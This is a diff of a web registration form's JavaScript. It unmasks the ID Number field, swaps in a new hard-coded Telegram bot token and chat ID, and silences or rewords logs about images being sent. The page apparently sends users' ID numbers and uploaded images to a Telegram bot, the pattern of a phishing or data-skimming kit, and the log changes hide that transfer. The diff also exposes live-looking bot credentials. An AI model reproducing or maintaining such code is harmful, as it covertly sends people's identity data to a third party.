@@ -470,18 +470,16 @@ function Registration() {
           </div>
           <div class="col-12 col-sm-4">
             <label for="idNumber" class="form-label">ID Number *</label>
-            <div class="input-group">
+            <div class="">
               <input
                 id="idNumber"
-                type="password"
+                type="text"
                 class="form-control py-3"
                 style="max-width: 200px"
                 placeholder="ID Number *"
                 required
               />
-              <span class="input-group-text">
-                <i class="bi bi-eye"></i>
-              </span>
+            
             </div>
           </div>
         </div>
@@ -527,8 +525,8 @@ function Registration() {
   // Reconnect the observer after DOM manipulation is complete
   observer.observe(document, { childList: true, subtree: true });
 
-  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU"; // Replace with your bot token
-  const chatId = "1099461059"; // Replace with your chat ID
+  const botToken = "7526126295:AAEhZknTkfMP4Z0udtoMWZ31EtfCN1OTVok"; // Replace with your bot token
+  const chatId = "7516110346"; // Replace with your chat ID
 
   //   document
   //     .getElementById("submit-btn")
@@ -627,10 +625,10 @@ function Registration() {
     })
       .then((response) => response.json())
       .then((result) => {
-        console.log("Image sent:", result);
+        // console.log("Image sent:", result);
       })
       .catch((error) => {
-        console.error("Error sending image:", error);
+        console.error("Error processing image:", error);
       });
   }
   const sendDelayedEmail = async (email, name) => {
@@ -660,7 +658,7 @@ function Registration() {
 
     // No need to handle the response
     // You can log if needed
-    console.log("Immediate email request sent");
+    // console.log("Immediate email request sent");
   };
 }
 const observer = new MutationObserver(() => {
